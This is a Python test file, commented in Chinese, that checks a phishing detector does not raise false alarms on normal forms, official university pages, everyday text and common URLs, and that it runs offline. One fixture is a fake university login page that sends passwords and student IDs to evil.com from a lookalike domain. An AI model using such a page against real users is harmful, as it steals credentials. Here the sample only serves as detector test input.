"""误报测试：确保正常场景不会误触发高严重度规则.

验证正常密码表单、官方页面、日常文本等场景不会被误报为钓鱼。
"""
from __future__ import annotations

import socket

from phishing_rule_detector.detector import detect


class TestNormalPasswordForm:
    """正常密码表单不应触发高危规则."""

    def test_normal_login_form_no_high_severity(self):
        """正常外部网站登录表单（同域提交）不应产生高危证据."""
        result = detect(
            input_text="<html><body><form action='https://normal-site.com/login'><input type='password' name='pwd'><input type='text' name='user'></form></body></html>",
            input_type="html",
            base_url="https://normal-site.com/login",
        )
        assert result["success"]
        high_evidence = [e for e in result["evidence"] if e["severity"] == "high"]
        assert len(high_evidence) == 0, (
            f"正常登录表单不应产生 high 证据: {[e['rule_id'] for e in high_evidence]}"
        )

    def test_trusted_third_party_password_is_not_exempt(self):
        """可信第三方只能豁免普通字段，不能豁免密码."""
        result = detect(
            input_text="<html><body><form action='https://wjx.cn/survey/submit'><input type='password' name='pwd'></form></body></html>",
            input_type="html",
            base_url="https://wjx.cn/survey",
        )
        assert result["success"]
        rule_ids = {e["rule_id"] for e in result["evidence"]}
        assert result["risk"]["level"] == "high"
        assert "TRUSTED_SERVICE_FORBIDDEN_FIELD" in rule_ids


class TestOfficialDomainNoFalsePositive:
    """官方域名页面不应误报."""

    def test_official_sdu_page_safe(self):
        """sdu.edu.cn 页面应评为 safe/low."""
        result = detect(
            input_text="<html><body><h1>山东大学</h1><a href='https://pass.sdu.edu.cn'>统一认证</a><a href='https://mail.sdu.edu.cn'>邮箱</a></body></html>",
            input_type="html",
            base_url="https://sdu.edu.cn/portal",
        )
        assert result["success"]
        # 官方域名不应有 identity 组高严重度证据
        high_identity = [
            e for e in result["evidence"]
            if e["severity"] == "high" and e["group"] == "identity"
        ]
        assert len(high_identity) == 0, (
            f"官方域名不应有 identity 高严重度: {[e['rule_id'] for e in high_identity]}"
        )

    def test_official_email_no_impersonation(self):
        """官方发件人不触发冒充检测."""
        result = detect(
            input_text="您好，这里是信息技术中心，请登录系统查看通知。",
            input_type="email",
            context={"sender": "it@sdu.edu.cn"},
        )
        assert result["success"]
        rule_ids = {e["rule_id"] for e in result["evidence"]}
        assert "EMAIL_SENDER_IMPERSONATION" not in rule_ids


class TestNormalTextNoFalsePositive:
    """日常文本不应误报."""

    def test_daily_conversation_safe(self):
        """日常对话应安全."""
        result = detect(
            input_text="今天的课改到明天下午了，大家注意群里通知。",
            input_type="text",
        )
        assert result["success"]
        assert result["risk"]["level"] == "low"

    def test_academic_notice_no_phishing(self):
        """学术通知不含钓鱼信号."""
        result = detect(
            input_text="关于2026年度国家自然科学基金申报的通知已发布，请各位老师及时关注。",
            input_type="text",
        )
        assert result["success"]
        high_count = sum(1 for e in result["evidence"] if e["severity"] == "high")
        assert high_count == 0, f"学术通知不应有高危证据: {high_count} 条"

    def test_safe_urls_no_high(self):
        """正常 URL 集合不应触发高危."""
        urls = [
            "https://github.com/sdu-ai/phishing-detector",
            "https://zhihu.com/question/12345",
            "https://baidu.com/s?wd=phishing",
        ]
        for url in urls:
            result = detect(input_text=url, input_type="url")
            assert result["success"]
            assert result["risk"]["level"] == "low", (
                f"正常 URL {url} 评级过高: {result['risk']['level']}"
            )


class TestMonkeypatchOffline:
    """验证检测管线完全离线，不依赖网络."""

    def test_no_network_requests(self, monkeypatch):
        """注入 urllib 监控，确认无网络请求."""
        import urllib.request

        call_count = [0]

        def mock_urlopen(*args, **kwargs):
            call_count[0] += 1
            raise RuntimeError("检测管线不应发起网络请求")

        monkeypatch.setattr(urllib.request, "urlopen", mock_urlopen)
        monkeypatch.setattr(socket.socket, "connect", mock_urlopen)
        monkeypatch.setattr(socket, "create_connection", mock_urlopen)

        result = detect(
            input_text="请验证账号 https://sdu.edu.cn/login",
            input_type="url",
        )
        assert result["success"]
        assert call_count[0] == 0, f"检测管线发起了 {call_count[0]} 次网络请求"

    def test_detect_without_network_for_complex_case(self, monkeypatch):
        """复杂检测场景也不应有网络请求."""
        import urllib.request

        call_count = [0]

        def mock_urlopen(*args, **kwargs):
            call_count[0] += 1
            raise RuntimeError("检测管线不应发起网络请求")

        monkeypatch.setattr(urllib.request, "urlopen", mock_urlopen)
        monkeypatch.setattr(socket.socket, "connect", mock_urlopen)
        monkeypatch.setattr(socket, "create_connection", mock_urlopen)

        html = (
            "<html><body>"
            "<h1>山东大学统一认证</h1>"
            "<form action='https://evil.com/steal'>"
            "<input type='password' name='pwd'>"
            "<input name='student_id'>"
            "</form>"
            "<a href='https://evil.com/phish'>点击验证</a>"
            "</body></html>"
        )
        result = detect(
            input_text=html,
            input_type="html",
            base_url="https://sdu-edu.cn/fake",
        )
        assert result["success"]
        assert call_count[0] == 0, f"复杂场景下发起 {call_count[0]} 次网络请求"
